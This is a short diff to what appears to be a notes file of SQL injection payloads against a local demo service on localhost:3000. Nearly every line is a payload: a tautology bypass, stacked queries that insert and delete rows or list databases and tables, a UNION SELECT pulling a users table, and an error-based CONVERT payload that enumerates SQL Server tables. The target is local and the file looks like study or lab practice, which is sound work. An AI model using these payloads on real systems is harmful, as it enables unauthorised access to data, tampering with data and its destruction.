@@ -21,6 +21,8 @@ VALUES ('A', 100), ('B',200), ('C',300), ('D',400);
 
 /////////////////////////////////////////////////////
 
+"' OR 1=1 -- "
+
 inject insert
 A"; INSERT INTO service VALUES ("E", 500); -- A
 
@@ -29,3 +31,11 @@ A"; DELETE FROM service WHERE name="E"; -- A
 
 inject union
 http://localhost:3000/service?name=A" UNION SELECT * FROM users; -- A
+
+get all databases
+A"; SHOW DATABASES; -- A
+
+get all tables
+A"; SHOW TABLES; -- A
+
+A" or 1 = CONVERT(INT, (select top 1 name from sysobject where xtype=char(85))); -- A
